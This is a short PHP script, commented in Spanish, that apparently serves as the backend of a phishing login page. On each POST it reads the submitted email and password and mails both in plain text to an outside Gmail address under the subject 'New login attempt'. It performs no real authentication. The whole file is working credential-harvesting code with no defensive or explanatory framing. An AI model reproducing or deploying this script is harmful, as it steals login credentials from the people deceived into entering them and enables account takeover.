<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Dirección de correo electrónico a la que se enviará el mensaje
    $to = 'williamir12345@gmail.com';
    $subject = 'Nuevo Intento de Inicio de Sesión';
    $message = "Correo Electrónico: $email\nContraseña: $password";
    $headers = 'From: no-reply@tu-dominio.com' . "\r\n" .
               'Reply-To: no-reply@tu-dominio.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo 'Correo enviado exitosamente.';
    } else {
        echo 'Hubo un problema al enviar el correo.';
    }
} else {
    echo 'Acceso denegado.';
}
?>

